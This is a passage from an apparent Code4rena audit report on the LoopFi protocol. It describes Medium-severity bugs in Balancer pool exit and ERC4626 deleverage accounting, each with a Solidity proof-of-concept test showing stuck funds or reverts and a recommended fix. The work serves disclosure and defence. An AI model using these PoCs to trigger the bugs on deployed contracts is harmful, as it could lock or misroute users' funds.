        maxAmountsIn[0] = 0;
        maxAmountsIn[1] = borrowAmount / 2 - 1 ether;
        maxAmountsIn[2] = 0;

        uint256[] memory tokensIn = new uint256[](2);
        tokensIn[0] = borrowAmount / 2 - 1 ether;
        tokensIn[1] = 0;

        // Increase the leverage of the position, reverts
        // Swapping underlying tokens to collateral tokens, the joining a Balancer pool
        vm.expectRevert(bytes("BAL#506"));
        userProxy.execute(
            address(positionAction),
            abi.encodeWithSelector(
                positionAction.increaseLever.selector,
                LeverParams({
                    position: address(userProxy),
                    vault: address(vault),
                    collateralToken: address(stakingLPEth),
                    primarySwap: SwapParams({
                        swapProtocol: SwapProtocol.BALANCER,
                        swapType: SwapType.EXACT_IN,
                        assetIn: address(underlyingToken),
                        amount: borrowAmount / 2,
                        limit: 0,
                        recipient: address(positionAction),
                        deadline: block.timestamp,
                        args: abi.encode(weightedPoolIdArray, assets)
                    }),
                    auxSwap: emptySwap,
                    auxAction: PoolActionParams(
                        Protocol.BALANCER,
                        0,
                        user,
                        abi.encode(poolId, tokens, tokensIn, maxAmountsIn)
                    )
                }),
                address(0),
                0,
                address(user),
                emptyPermitParams
            )
        );
    }

    function _createBalancerPool(address t1, address t2) internal returns (IComposableStablePool pool_) {
        uint256 amount = 5_000_000_000 ether;
        deal(t1, address(this), amount);
        deal(t2, address(this), amount);

        uint256[] memory maxAmountsIn = new uint256[](2);
        address[] memory assets = new address[](2);
        assets[0] = t1;
        uint256[] memory weights = new uint256[](2);
        weights[0] = 500000000000000000;
        weights[1] = 500000000000000000;

        bool tokenPlaced;
        address tempAsset;
        for (uint256 i; i < assets.length; i++) {
            if (!tokenPlaced) {
                if (uint160(assets[i]) > uint160(t2)) {
                    tokenPlaced = true;
                    tempAsset = assets[i];
                    assets[i] = t2;
                } else if (i == assets.length - 1) {
                    assets[i] = t2;
                }
            } else {
                address placeholder = assets[i];
                assets[i] = tempAsset;
                tempAsset = placeholder;
            }
        }

        for (uint256 i; i < assets.length; i++) {
            maxAmountsIn[i] = ERC20(assets[i]).balanceOf(address(this));
            ERC20(assets[i]).safeApprove(address(balancerVault), maxAmountsIn[i]);
        }

        pool_ = weightedPoolFactory.create(
            "50WETH-50TOKEN",
            "50WETH-50TOKEN",
            assets,
            weights,
            3e14, // swapFee (0.03%)
            address(this) // owner
        );

        balancerVault.joinPool(
            pool_.getPoolId(),
            address(this),
            address(this),
            JoinPoolRequest({
                assets: assets,
                maxAmountsIn: maxAmountsIn,
                userData: abi.encode(JoinKind.INIT, maxAmountsIn),
                fromInternalBalance: false
            })
        );
    }

    function getForkBlockNumber() internal pure virtual override(IntegrationTestBase) returns (uint256) {
        return 17870449; // Aug-08-2023 01:17:35 PM +UTC
    }
}
```

</details>

### Recommended Mitigation Steps

Set the `poolToken` according to the Balancer's vault and `PoolId`, something to:

```solidity
function updateLeverJoin(
    PoolActionParams memory poolActionParams,
    address joinToken,
    address upFrontToken,
    uint256 flashLoanAmount,
    uint256 upfrontAmount
) external view returns (PoolActionParams memory outParams) {
    outParams = poolActionParams;

    if (poolActionParams.protocol == Protocol.BALANCER) {
        (bytes32 poolId, address[] memory assets, uint256[] memory assetsIn, uint256[] memory maxAmountsIn) = abi
            .decode(poolActionParams.args, (bytes32, address[], uint256[], uint256[]));

        address poolToken = balancerVault.getPool(poolId);

        uint256 len = assets.length;
        // the offset is needed because of the BPT token that needs to be skipped from the join
        bool skipIndex = false;
        uint256 joinAmount = flashLoanAmount;
        if (upFrontToken == joinToken) {
            joinAmount += upfrontAmount;
        }

        // update the join parameters with the new amounts
        for (uint256 i = 0; i < len; ) {
            uint256 assetIndex = i - (skipIndex ? 1 : 0);
            if (assets[i] == joinToken) {
                maxAmountsIn[i] = joinAmount;
                assetsIn[assetIndex] = joinAmount;
            } else if (assets[i] == upFrontToken && assets[i] != poolToken) {
                maxAmountsIn[i] = upfrontAmount;
                assetsIn[assetIndex] = upfrontAmount;
            } else {
                skipIndex = skipIndex || assets[i] == poolToken;
            }
            unchecked {
                i++;
            }
        }

        // update the join parameters
        outParams.args = abi.encode(poolId, assets, assetsIn, maxAmountsIn);
    }
}
```

### Assessed type

DoS

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/241#event-14337577255)**

***

## [[M-07] `PositionAction4626::_onDecreaseLever` wrongly updates `tokenOut` forcing user's funds to be stuck in the position action contract](https://github.com/code-423n4/2024-07-loopfi-findings/issues/240)
*Submitted by [0xAlix2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/240), also found by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/83)*

Users can use `PositionAction::decreaseLever` to decrease the leverage of their positions when the collateral is an ERC4626, that position action interacts with `PositionAction4626::_onDecreaseLever`. With that, the protocol gives the ability to join/exit Balancer pools, leveraging down an ERC4626 position is handled in `PositionAction4626::_onDecreaseLever`.

This first step is that `tokenOut` is set to the redeemed 4626 amount; however, when `auxAction` exists, (i.e. the user wants to exit a Balancer pool), the `tokenOut` is updated to return the amount of the exit position, this poses multiple issues:

1. If the token out from Balancer is not the same as 4626's underlying this will wrongly update to another token's amount.
2. If the recipient is not in the position action contract, the tokens would be sent to another address, while it assumes that it received them.
3. If the `token = 4626`'s underlying, the recipient is the user, and the amount of from Balancer is less than the redeemed `tokenOut`, the contract would set the `tokenOut` as the Balancer return amount, which is less than the original `tokenOut`. This will return the wrong `tokenOut` in `PositionAction::onCreditFlashLoan`, sending the user a residual amount less than the real amount (the POC below is for this scenario).

The user's "extra" collateral amount will end up stuck in the position action contract forever.

### Proof of Concept

The following test assuming 3 reported bugs are fixed, to workaround this:

1. In `PositionAction4626::_onDecreaseLever`, replace:

```solidity
uint256 withdrawnCollateral = ICDPVault(leverParams.vault).withdraw(address(this), subCollateral);
```

with:

```solidity
uint256 withdrawnCollateral = ICDPVault(leverParams.vault).withdraw(leverParams.position, subCollateral);
```

2. In `PositionAction4626::_onIncreaseLever`, replace:

```solidity
return ICDPVault(leverParams.vault).deposit(address(this), addCollateralAmount);
```

with:

```solidity
return addCollateralAmount;
```

3. At the top of `PoolAction::updateLeverJoin`, add:

```solidity
poolToken = balancerVault.getPool(poolId);
```

### POC Contract

<details>

```solidity
contract PositionAction4626_Lever_Test is IntegrationTestBase {
    using SafeERC20 for ERC20;

    PRBProxy userProxy;
    address user;
    CDPVault vault;
    StakingLPEth stakingLPEth;
    PositionAction4626 positionAction;
    PermitParams emptyPermitParams;
    SwapParams emptySwap;
    PoolActionParams emptyPoolActionParams;

    bytes32[] weightedPoolIdArray;

    address constant wstETH_bb_a_WETH_BPTl = 0x41503C9D499ddbd1dCdf818a1b05e9774203Bf46;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant bbaweth = 0xbB6881874825E60e1160416D6C426eae65f2459E;
    bytes32 constant poolId = 0x41503c9d499ddbd1dcdf818a1b05e9774203bf46000000000000000000000594;

    function setUp() public override {
        super.setUp();
        setGlobalDebtCeiling(15_000_000 ether);

        token = ERC20PresetMinterPauser(wstETH);

        stakingLPEth = new StakingLPEth(address(token), "Staking LP ETH", "sLPETH");
        stakingLPEth.setCooldownDuration(0);
        vault = createCDPVault(stakingLPEth, 5_000_000 ether, 0, 1.25 ether, 1.0 ether, 1.05 ether);
        createGaugeAndSetGauge(address(vault), address(stakingLPEth));

        user = vm.addr(0x12341234);
        userProxy = PRBProxy(payable(address(prbProxyRegistry.deployFor(user))));

        positionAction = new PositionAction4626(
            address(flashlender),
            address(swapAction),
            address(poolAction),
            address(vaultRegistry)
        );

        weightedUnderlierPoolId = _createBalancerPool(address(token), address(underlyingToken)).getPoolId();

        oracle.updateSpot(address(token), 1 ether);
        oracle.updateSpot(address(stakingLPEth), 1 ether);
        weightedPoolIdArray.push(weightedUnderlierPoolId);
    }

    function test_wrongTokenOutAmount_decreaseLeverLossOfFunds() public {
        uint256 depositAmount = 250 ether;
        uint256 borrowAmount = 100 ether;

        uint256 flashLoanAmount = borrowAmount / 2;

        deal(address(token), user, depositAmount);

        address[] memory assets = new address[](2);
        assets[0] = address(underlyingToken);
        assets[1] = address(token);

        address[] memory tokens = new address[](3);
        tokens[0] = wstETH_bb_a_WETH_BPTl;
        tokens[1] = wstETH;
        tokens[2] = bbaweth;

        vm.startPrank(user);

        // Deposit `wstETH` to get `sLPETH`
        // Deposit 250 `sLPETH` to vault
        {
            token.approve(address(stakingLPEth), depositAmount);
            stakingLPEth.approve(address(userProxy), depositAmount);

            stakingLPEth.deposit(depositAmount, user);

            userProxy.execute(
                address(positionAction),
                abi.encodeWithSelector(
                    positionAction.deposit.selector,
                    address(userProxy),
                    address(vault),
                    CollateralParams({
                        targetToken: address(stakingLPEth),
                        amount: depositAmount,
                        collateralizer: address(user),
                        auxSwap: emptySwap
                    }),
                    emptyPermitParams
                )
            );
        }

        // Borrow 100 ETH
        {
            userProxy.execute(
                address(positionAction),
                abi.encodeWithSelector(
                    positionAction.borrow.selector,
                    address(userProxy),
                    address(vault),
                    CreditParams({amount: borrowAmount, creditor: user, auxSwap: emptySwap})
                )
            );

            // Collateral is 250 ETH, debt is 100 ETH
            (uint256 collateral, uint256 debt, , , , ) = vault.positions(address(userProxy));
            assertEq(collateral, depositAmount);
            assertEq(debt, borrowAmount);
        }

        // Increase leverage
        // Takes a flash loan of 50 ETH borrow tokens (adds that as a debt)
        // Swap the borrow tokens to collateral tokens, and join Balancer pool
        // (around 49 collateral tokens are deposited into the balancer position)
        {
            uint256[] memory maxAmountsIn = new uint256[](3);
            maxAmountsIn[0] = 0;
            maxAmountsIn[1] = borrowAmount / 2 - 1 ether;
            maxAmountsIn[2] = 0;
            uint256[] memory tokensIn = new uint256[](2);
            tokensIn[0] = borrowAmount / 2 - 1 ether;
            tokensIn[1] = 0;

            userProxy.execute(
                address(positionAction),
                abi.encodeWithSelector(
                    positionAction.increaseLever.selector,
                    LeverParams({
                        position: address(userProxy),
                        vault: address(vault),
                        collateralToken: address(stakingLPEth),
                        primarySwap: SwapParams({
                            swapProtocol: SwapProtocol.BALANCER,
                            swapType: SwapType.EXACT_IN,
                            assetIn: address(underlyingToken),
                            amount: flashLoanAmount,
                            limit: 0,
                            recipient: address(positionAction),
                            deadline: block.timestamp,
                            args: abi.encode(weightedPoolIdArray, assets)
                        }),
                        auxSwap: emptySwap,
                        auxAction: PoolActionParams(
                            Protocol.BALANCER,
                            0,
                            user,
                            abi.encode(poolId, tokens, tokensIn, maxAmountsIn)
                        )
                    }),
                    address(0),
                    0,
                    address(user),
                    emptyPermitParams
                )
            );

            // Collateral remains the same, debt increases by 50 ETH
            // User has around 56 Balancer LP tokens
            (uint256 collateral, uint256 debt, , , , ) = vault.positions(address(userProxy));
            assertEq(collateral, depositAmount);
            assertEq(debt, borrowAmount + flashLoanAmount);
            assertEq(IERC20(wstETH_bb_a_WETH_BPTl).balanceOf(user) / 1 ether, 56);
        }

        {
            // Verify that the position action contract and the user don't hold any collateral tokens
            assertEq(token.balanceOf(address(positionAction)), 0);
            assertEq(token.balanceOf(user), 0);

            uint256[] memory minAmountsOut = new uint256[](3);
            minAmountsOut[0] = 0;
            minAmountsOut[1] = 0;
            minAmountsOut[2] = 0;

            // Send the Balancer LP tokens to the position action contract, to exit the Balancer pool
            uint256 bptAmount = IERC20(wstETH_bb_a_WETH_BPTl).balanceOf(user);
            IERC20(wstETH_bb_a_WETH_BPTl).transfer(address(positionAction), bptAmount);

            // Leverage down the position
            // Takes a flash loan of 40 ETH borrow tokens (decreases the debt), withdraws 70 ETH collateral tokens (residual should be sent to the user)
            // Swap collateral tokens to borrow tokens, to repay the flash loan
            // Exits the Balancer pool, and sends the residual collateral tokens to the user (this is where the loss of funds occurs)
            userProxy.execute(
                address(positionAction),
                abi.encodeWithSelector(
                    positionAction.decreaseLever.selector,
                    LeverParams({
                        position: address(userProxy),
                        vault: address(vault),
                        collateralToken: address(stakingLPEth),
                        auxSwap: emptySwap,
                        primarySwap: SwapParams({
                            swapProtocol: SwapProtocol.BALANCER,
                            swapType: SwapType.EXACT_OUT,
                            assetIn: address(token),
                            amount: 40 ether,
                            limit: 50 ether,
                            recipient: address(positionAction),
                            deadline: block.timestamp,
                            args: abi.encode(weightedPoolIdArray, assets)
                        }),
                        auxAction: PoolActionParams(
                            Protocol.BALANCER,
                            0,
                            user,
                            abi.encode(poolId, wstETH_bb_a_WETH_BPTl, bptAmount, 0, tokens, minAmountsOut)
                        )
                    }),
                    70 ether,
                    address(user)
                )
            );

            // Collateral is 180 ETH, debt is 110 ETH
            (uint256 collateral, uint256 debt, , , , ) = vault.positions(address(userProxy));
            assertEq(collateral, depositAmount - 70 ether);
            assertEq(debt, borrowAmount + flashLoanAmount - 40 ether);

            // All balancer LP tokens are burnt
            assertEq(IERC20(wstETH_bb_a_WETH_BPTl).balanceOf(user), 0);
            assertEq(IERC20(wstETH_bb_a_WETH_BPTl).balanceOf(address(positionAction)), 0);

            // User has 59 collateral tokens, Balancer's exit tokens (49 from above) + residual ~(50 - 40)
            assertEq(token.balanceOf(user) / 1 ether, 59);
            // Position action now holds 20 collateral tokens that are stuck (70 - ~50)
            assertEq(token.balanceOf(address(positionAction)) / 1 ether, 20);
        }
    }

    function _createBalancerPool(address t1, address t2) internal returns (IComposableStablePool pool_) {
        uint256 amount = 5_000_000_000 ether;
        deal(t1, address(this), amount);
        deal(t2, address(this), amount);

        uint256[] memory maxAmountsIn = new uint256[](2);
        address[] memory assets = new address[](2);
        assets[0] = t1;
        uint256[] memory weights = new uint256[](2);
        weights[0] = 500000000000000000;
        weights[1] = 500000000000000000;

        bool tokenPlaced;
        address tempAsset;
        for (uint256 i; i < assets.length; i++) {
            if (!tokenPlaced) {
                if (uint160(assets[i]) > uint160(t2)) {
                    tokenPlaced = true;
                    tempAsset = assets[i];
                    assets[i] = t2;
                } else if (i == assets.length - 1) {
                    assets[i] = t2;
                }
            } else {
                address placeholder = assets[i];
                assets[i] = tempAsset;
                tempAsset = placeholder;
            }
        }

        for (uint256 i; i < assets.length; i++) {
            maxAmountsIn[i] = ERC20(assets[i]).balanceOf(address(this));
            ERC20(assets[i]).safeApprove(address(balancerVault), maxAmountsIn[i]);
        }

        pool_ = weightedPoolFactory.create(
            "50WETH-50TOKEN",
            "50WETH-50TOKEN",
            assets,
            weights,
            3e14, // swapFee (0.03%)
            address(this) // owner
        );

        balancerVault.joinPool(
            pool_.getPoolId(),
            address(this),
            address(this),
            JoinPoolRequest({
                assets: assets,
                maxAmountsIn: maxAmountsIn,
                userData: abi.encode(JoinKind.INIT, maxAmountsIn),
                fromInternalBalance: false
            })
        );
    }

    function getForkBlockNumber() internal pure virtual override(IntegrationTestBase) returns (uint256) {
        return 17870449; // Aug-08-2023 01:17:35 PM +UTC
    }
}
```

</details>

### Recommended Mitigation Steps

Handle the multiple scenarios where the recipient might not be the position actions contract or where the `tokenOut` from Balancer isn't the same as the 4626's underlying token. In the if block, just set the `tokenOut` as the contract's balance which should handle all edge cases.

```diff
function _onDecreaseLever(
    LeverParams memory leverParams,
    uint256 subCollateral
) internal override returns (uint256 tokenOut) {
    ...

    if (leverParams.auxAction.args.length != 0) {
        bytes memory exitData = _delegateCall(
            address(poolAction),
            abi.encodeWithSelector(poolAction.exit.selector, leverParams.auxAction)
        );

-       tokenOut = abi.decode(exitData, (uint256));
+       tokenOut = IERC20(IERC4626(leverParams.collateralToken).asset()).balanceOf(address(this));
    }
}
```

### Assessed type

Error

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/240#event-14337567854)**

**[Koolex (judge) decreased severity to Medium](https://github.com/code-423n4/2024-07-loopfi-findings/issues/240#issuecomment-2446748482)**

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-07-loopfi-findings/issues/240).*

***

## [[M-08] `PoolAction::_balancerExit` returns wrong token out amount](https://github.com/code-423n4/2024-07-loopfi-findings/issues/239)
*Submitted by [0xAlix2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/239)*

Users use `PoolAction::exit` to exit a Balancer pool position, it calls `_balancerExit` to do the job. It is expected to exit the pool and return the amount out of the token; however, it returns the whole recipient's balance, without considering the case where the recipient is holding an amount of the same token from different sources. It'll return an exaggerated amount rather than the amount out.

This will cause `PositionAction4626::_onDecreaseLever` to revert sometimes. In this case, the user is leveraging down, exiting a Balancer pool, and holds some `tokenOut` amount. In `PositionAction::onCreditFlashLoan`, `withdrawnCollateral` would be an unreal exaggerated amount, and the contract will try to send back `residualAmount` which will be greater than its balance.

### Proof of Concept

Add the following test in `src/test/integration/PoolAction.t.sol`:

```solidity
function test_wrongBalancerExitAmount() public {
    uint256 amount = 10 ether;

    deal(wstETH, user, amount * 2);

    (uint8 v, bytes32 r, bytes32 s) = PermitMaker.getPermit2TransferFromSignature(
        address(wstETH),
        address(poolAction),
        amount,
        NONCE,
        block.timestamp,
        userPk
    );

    PermitParams[] memory permitParamsArray = new PermitParams[](3);
    permitParamsArray[1] = PermitParams(ApprovalType.PERMIT2, amount, NONCE, block.timestamp, v, r, s);

    address[] memory tokens = new address[](3);
    tokens[0] = wstETH_bb_a_WETH_BPTl;
    tokens[1] = wstETH;
    tokens[2] = bbaweth;

    uint256[] memory maxAmountsIn = new uint256[](3);
    maxAmountsIn[0] = 0;
    maxAmountsIn[1] = amount;
    maxAmountsIn[2] = 0;

    uint256[] memory tokensIn = new uint256[](2);
    tokensIn[0] = amount;
    tokensIn[1] = 0;

    uint256[] memory minAmountsOut = new uint256[](3);
    minAmountsOut[0] = 0;
    minAmountsOut[1] = 0;
    minAmountsOut[2] = 0;

    vm.startPrank(user);

    // Joins Balancer pool with 10 WSTETH
    poolAction.transferAndJoin(
        user,
        permitParamsArray,
        PoolActionParams(Protocol.BALANCER, 0, user, abi.encode(poolId, tokens, tokensIn, maxAmountsIn))
    );

    uint256 balancerLP = ERC20(wstETH_bb_a_WETH_BPTl).balanceOf(user);

    // Receives 11 Balancer LP tokens
    assertEq(balancerLP / 1 ether, 11);
    // Balance is 10 WSTETH
    assertEq(ERC20(wstETH).balanceOf(user), amount);

    // Transfer Balancer LP tokens to PoolAction
    ERC20(wstETH_bb_a_WETH_BPTl).transfer(address(poolAction), balancerLP);

    // Exits the Balancer pool
    uint256 amountOut = poolAction.exit(
        PoolActionParams(
            Protocol.BALANCER,
            0,
            user,
            abi.encode(poolId, wstETH_bb_a_WETH_BPTl, balancerLP, 0, tokens, minAmountsOut)
        )
    );

    // Amount returned by the function is 19 WSTETH instead of 9 WSTETH
    assertEq(amountOut / 1 ether, 19);
    // Balance is 19 WSTETH
    assertEq(ERC20(wstETH).balanceOf(user) / 1 ether, 19);
}
```

### Recommended Mitigation Steps

Instead of returning the whole recipient's balance, return the difference between his balances before and after the exit.

```diff
function _balancerExit(PoolActionParams memory poolActionParams) internal returns (uint256 retAmount) {
    (
        bytes32 poolId,
        address bpt,
        uint256 bptAmount,
        uint256 outIndex,
        address[] memory assets,
        uint256[] memory minAmountsOut
    ) = abi.decode(poolActionParams.args, (bytes32, address, uint256, uint256, address[], uint256[]));

    if (bptAmount != 0) IERC20(bpt).forceApprove(address(balancerVault), bptAmount);

+   uint256 tmpOutIndex = outIndex;
+   for (uint256 i = 0; i <= tmpOutIndex; i++) if (assets[i] == bpt) tmpOutIndex++;
+   uint256 balanceBefore = IERC20(assets[tmpOutIndex]).balanceOf(poolActionParams.recipient);

    balancerVault.exitPool(
        poolId,
        address(this),
        payable(poolActionParams.recipient),
        ExitPoolRequest({
            assets: assets,
            minAmountsOut: minAmountsOut,
            userData: abi.encode(ExitKind.EXACT_BPT_IN_FOR_ONE_TOKEN_OUT, bptAmount, outIndex),
            toInternalBalance: false
        })
    );

-   for (uint256 i = 0; i <= outIndex; ) {
-       if (assets[i] == bpt) {
-           outIndex++;
-       }
-
-       unchecked {
-           ++i;
-       }
-   }

-   return IERC20(assets[outIndex]).balanceOf(address(poolActionParams.recipient));
+   return IERC20(assets[tmpOutIndex]).balanceOf(poolActionParams.recipient) - balanceBefore;
}
```

### Assessed type

DoS

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/239#event-14337579629)**

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/239#issuecomment-2385445757):**
 > Could you please adjust the PoC to support this claim in PJQA please?
> 
> > This will cause `PositionAction4626::_onDecreaseLever` to revert sometimes. In this case, the user is leveraging down, exiting a Balancer pool, and holds some `tokenOut` amount. In `PositionAction::onCreditFlashLoan`, `withdrawnCollateral` would be an unreal exaggerated amount, and the contract will try to send back `residualAmount` which will be greater than it's balance

**[0xAlix2 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/239#issuecomment-2389522486):**
> @Koolex - My bad for not providing it in the original issue, but I wanted to keep it as simple as possible as this POC is a bit more complicated.
> 
> The following test assuming 3 reported bugs are fixed, similar to [issue #240](https://github.com/code-423n4/2024-07-loopfi-findings/issues/240), to workaround this:
> 
> 1. In `PositionAction4626::_onDecreaseLever`, replace:
> ```solidity
> uint256 withdrawnCollateral = ICDPVault(leverParams.vault).withdraw(address(this), subCollateral);
> ```
>
> with:
>
> ```solidity
> uint256 withdrawnCollateral = ICDPVault(leverParams.vault).withdraw(leverParams.position, subCollateral);
> ```
>
> 2. In `PositionAction4626::_onIncreaseLever`, replace:
>
> ```solidity
> return ICDPVault(leverParams.vault).deposit(address(this), addCollateralAmount);
> ```
>
> with:
>
> ```solidity
> return addCollateralAmount;
> ```
> 
> 3. At the top of `PoolAction::updateLeverJoin`, add:
> 
> ```solidity
> poolToken = balancerVault.getPool(poolId);
> ```
> 
> <details>
> 
> ```solidity
> contract PositionAction4626_Lever_Test is IntegrationTestBase {
>     using SafeERC20 for ERC20;
> 
>     PRBProxy userProxy;
>     address user;
>     CDPVault vault;
>     StakingLPEth stakingLPEth;
>     PositionAction4626 positionAction;
>     PermitParams emptyPermitParams;
>     SwapParams emptySwap;
>     PoolActionParams emptyPoolActionParams;
> 
>     bytes32[] weightedPoolIdArray;
> 
>     address constant wstETH_bb_a_WETH_BPTl = 0x41503C9D499ddbd1dCdf818a1b05e9774203Bf46;
>     address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
>     address constant bbaweth = 0xbB6881874825E60e1160416D6C426eae65f2459E;
>     bytes32 constant poolId = 0x41503c9d499ddbd1dcdf818a1b05e9774203bf46000000000000000000000594;
> 
>     function setUp() public override {
>         super.setUp();
>         setGlobalDebtCeiling(15_000_000 ether);
> 
>         token = ERC20PresetMinterPauser(wstETH);
> 
>         stakingLPEth = new StakingLPEth(address(token), "Staking LP ETH", "sLPETH");
>         stakingLPEth.setCooldownDuration(0);
>         vault = createCDPVault(stakingLPEth, 5_000_000 ether, 0, 1.25 ether, 1.0 ether, 1.05 ether);
>         createGaugeAndSetGauge(address(vault), address(stakingLPEth));
> 
>         user = vm.addr(0x12341234);
>         userProxy = PRBProxy(payable(address(prbProxyRegistry.deployFor(user))));
> 
>         positionAction = new PositionAction4626(
>             address(flashlender),
>             address(swapAction),
>             address(poolAction),
>             address(vaultRegistry)
>         );
> 
>         weightedUnderlierPoolId = _createBalancerPool(address(token), address(underlyingToken)).getPoolId();
> 
>         oracle.updateSpot(address(token), 1 ether);
>         oracle.updateSpot(address(stakingLPEth), 1 ether);
>         weightedPoolIdArray.push(weightedUnderlierPoolId);
>     }
> 
>     function test_wrongBalancerExitAmount_2() public {
>         uint256 depositAmount = 250 ether;
>         uint256 borrowAmount = 100 ether;
> 
>         uint256 flashLoanAmount = borrowAmount / 2;
> 
>         deal(address(token), user, depositAmount);
> 
>         address[] memory assets = new address[](2);
>         assets[0] = address(underlyingToken);
>         assets[1] = address(token);
> 
>         address[] memory tokens = new address[](3);
>         tokens[0] = wstETH_bb_a_WETH_BPTl;
>         tokens[1] = wstETH;
>         tokens[2] = bbaweth;
> 
>         vm.startPrank(user);
> 
>         // Deposit `wstETH` to get `sLPETH`
>         // Deposit 250 `sLPETH` to vault
>         {
>             token.approve(address(stakingLPEth), depositAmount);
>             stakingLPEth.approve(address(userProxy), depositAmount);
> 
>             stakingLPEth.deposit(depositAmount, user);
> 
>             userProxy.execute(
>                 address(positionAction),
>                 abi.encodeWithSelector(
>                     positionAction.deposit.selector,
>                     address(userProxy),
>                     address(vault),
>                     CollateralParams({
>                         targetToken: address(stakingLPEth),
>                         amount: depositAmount,
>                         collateralizer: address(user),
>                         auxSwap: emptySwap
>                     }),
>                     emptyPermitParams
>                 )
>             );
>         }
> 
>         // Borrow 100 ETH
>         {
>             userProxy.execute(
>                 address(positionAction),
>                 abi.encodeWithSelector(
>                     positionAction.borrow.selector,
>                     address(userProxy),
>                     address(vault),
>                     CreditParams({amount: borrowAmount, creditor: user, auxSwap: emptySwap})
>                 )
>             );
> 
>             // Collateral is 250 ETH, debt is 100 ETH
>             (uint256 collateral, uint256 debt, , , , ) = vault.positions(address(userProxy));
>             assertEq(collateral, depositAmount);
>             assertEq(debt, borrowAmount);
>         }
> 
>         // Increase leverage
>         // Takes a flash loan of 50 ETH borrow tokens (adds that as a debt)
>         // Swap the borrow tokens to collateral tokens, and join Balancer pool
>         // (around 49 collateral tokens are deposited into the balancer position)
>         {
>             uint256[] memory maxAmountsIn = new uint256[](3);
>             maxAmountsIn[0] = 0;
>             maxAmountsIn[1] = borrowAmount / 2 - 1 ether;
>             maxAmountsIn[2] = 0;
>             uint256[] memory tokensIn = new uint256[](2);
>             tokensIn[0] = borrowAmount / 2 - 1 ether;
>             tokensIn[1] = 0;
> 
>             userProxy.execute(
>                 address(positionAction),
>                 abi.encodeWithSelector(
>                     positionAction.increaseLever.selector,
>                     LeverParams({
>                         position: address(userProxy),
>                         vault: address(vault),
>                         collateralToken: address(stakingLPEth),
>                         primarySwap: SwapParams({
>                             swapProtocol: SwapProtocol.BALANCER,
>                             swapType: SwapType.EXACT_IN,
>                             assetIn: address(underlyingToken),
>                             amount: flashLoanAmount,
>                             limit: 0,
>                             recipient: address(positionAction),
>                             deadline: block.timestamp,
>                             args: abi.encode(weightedPoolIdArray, assets)
>                         }),
>                         auxSwap: emptySwap,
>                         auxAction: PoolActionParams(
>                             Protocol.BALANCER,
>                             0,
>                             user,
>                             abi.encode(poolId, tokens, tokensIn, maxAmountsIn)
>                         )
>                     }),
>                     address(0),
>                     0,
>                     address(user),
>                     emptyPermitParams
>                 )
>             );
> 
>             // Collateral remains the same, debt increases by 50 ETH
>             // User has around 56 Balancer LP tokens
>             (uint256 collateral, uint256 debt, , , , ) = vault.positions(address(userProxy));
>             assertEq(collateral, depositAmount);
>             assertEq(debt, borrowAmount + flashLoanAmount);
>             assertEq(IERC20(wstETH_bb_a_WETH_BPTl).balanceOf(user) / 1 ether, 56);
>         }
> 
>         {
>             // Verify that the position action contract and the user don't hold any collateral tokens
>             assertEq(token.balanceOf(address(positionAction)), 0);
>             assertEq(token.balanceOf(user), 0);
> 
>             uint256[] memory minAmountsOut = new uint256[](3);
>             minAmountsOut[0] = 0;
>             minAmountsOut[1] = 0;
>             minAmountsOut[2] = 0;
> 
>             // Send the Balancer LP tokens to the position action contract, to exit the Balancer pool
>             uint256 bptAmount = IERC20(wstETH_bb_a_WETH_BPTl).balanceOf(user);
>             IERC20(wstETH_bb_a_WETH_BPTl).transfer(address(positionAction), bptAmount);
> 
>             deal(address(token), user, depositAmount);
> 
>             // User holds 100 tokens
>             assertEq(token.balanceOf(user), depositAmount);
> 
>             // Leverage down the position
>             // Takes a flash loan of 40 ETH borrow tokens (decreases the debt), withdraws 70 ETH collateral tokens (residual should be sent to the user)
>             // Swap collateral tokens to borrow tokens, to repay the flash loan
>             // Exits the Balancer pool, and sends the residual collateral tokens to the user
>             // REVERTS
>             vm.expectRevert(bytes("ERC20: transfer amount exceeds balance"));
>             userProxy.execute(
>                 address(positionAction),
>                 abi.encodeWithSelector(
>                     positionAction.decreaseLever.selector,
>                     LeverParams({
>                         position: address(userProxy),
>                         vault: address(vault),
>                         collateralToken: address(stakingLPEth),
>                         auxSwap: emptySwap,
>                         primarySwap: SwapParams({
>                             swapProtocol: SwapProtocol.BALANCER,
>                             swapType: SwapType.EXACT_OUT,
>                             assetIn: address(token),
>                             amount: 40 ether,
>                             limit: 50 ether,
>                             recipient: address(positionAction),
>                             deadline: block.timestamp,
>                             args: abi.encode(weightedPoolIdArray, assets)
>                         }),
>                         auxAction: PoolActionParams(
>                             Protocol.BALANCER,
>                             0,
>                             user,
>                             abi.encode(poolId, wstETH_bb_a_WETH_BPTl, bptAmount, 0, tokens, minAmountsOut)
>                         )
>                     }),
>                     70 ether,
>                     address(user)
>                 )
>             );
>         }
>     }
> 
>     function _createBalancerPool(address t1, address t2) internal returns (IComposableStablePool pool_) {
>         uint256 amount = 5_000_000_000 ether;
>         deal(t1, address(this), amount);
>         deal(t2, address(this), amount);
> 
>         uint256[] memory maxAmountsIn = new uint256[](2);
>         address[] memory assets = new address[](2);
>         assets[0] = t1;
>         uint256[] memory weights = new uint256[](2);
>         weights[0] = 500000000000000000;
>         weights[1] = 500000000000000000;
> 
>         bool tokenPlaced;
>         address tempAsset;
>         for (uint256 i; i < assets.length; i++) {
>             if (!tokenPlaced) {
>                 if (uint160(assets[i]) > uint160(t2)) {
>                     tokenPlaced = true;
>                     tempAsset = assets[i];
>                     assets[i] = t2;
>                 } else if (i == assets.length - 1) {
>                     assets[i] = t2;
>                 }
>             } else {
>                 address placeholder = assets[i];
>                 assets[i] = tempAsset;
>                 tempAsset = placeholder;
>             }
>         }
> 
>         for (uint256 i; i < assets.length; i++) {
>             maxAmountsIn[i] = ERC20(assets[i]).balanceOf(address(this));
